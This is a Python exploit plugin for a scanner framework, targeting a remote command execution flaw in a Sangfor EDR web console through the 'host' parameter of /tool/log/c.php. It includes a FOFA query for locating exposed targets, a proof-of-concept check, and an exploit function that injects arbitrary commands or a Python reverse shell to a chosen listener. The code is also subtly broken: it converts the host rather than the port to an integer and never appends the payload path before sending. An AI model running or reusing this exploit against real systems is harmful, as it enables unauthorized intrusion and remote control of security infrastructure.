#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import json
import requests
import warnings

def vuln_info():
    info={
        'vuln_name': 'EDR终端检测系统RCE',  #漏洞名称
        'vuln_referer':'https://blog.csdn.net/qq_32393893/article/details/108077482',  #漏洞来源
        'vuln_author':'qianxiao996',  #插件作者
        'cms_name':'深信服',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''漏洞位置：host 参数
https://xxx.com:xxx/tool/log/c.php?strip_slashes=system&host=id''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_class':'远程命令执行',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''升级新版本''',
        'FofaQuery_link':'/ui/login.php', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery':'title="终端检测响应平台"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc
        'isexp':1  #是否有exp
    }
    return info


#修改下返回字段  {"Result":True,"Result_Info":"payload","Debug_Info":""}
def do_poc(url,hostname,port,scheme,heads={}):
    result = {"Result":False,"Result_Info":"payload","Debug_Info":"","Error_Info":""}
    try:
        bug = '/tool/log/c.php?strip_slashes=system&host=id'
        url = url + bug
        r = requests.get(url,timeout=5,headers=heads)
        if "uid=" in r.text:
            result['Result'] = True
            result['Result_Info'] = bug
        else:
            result['Result'] = False
    except Exception as e:
        result['Error_Info'] = str(e)+str(e.__traceback__.tb_lineno)+'行'
    return result

def do_exp(url,heads={},exp_type='cmd',exp_cmd='whoami',lhost='127.0.0.1',lport=8888):
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
    result = {"Result":False,"Result_Info":"payload","Debug_Info":"","Error_Info":""}
    try:
        result = {"type":'Result', "value":"root", "color":"black"}
        #命令执行
        if exp_type=='cmd':
            bug = '/tool/log/c.php?strip_slashes=system&host='+exp_cmd
        #反弹shell    
        if exp_type=='shell':
            bug = '/tool/log/c.php?strip_slashes=system&host='+'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+lhost+'",'+int(lhost)+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        r = requests.get(url,timeout=5,headers=heads)
        result['Result'] = True
        result['Result_Info'] = r.text
    except Exception as e:
        result['Error_Info'] = str(e)+str(e.__traceback__.tb_lineno)+'行'
    return result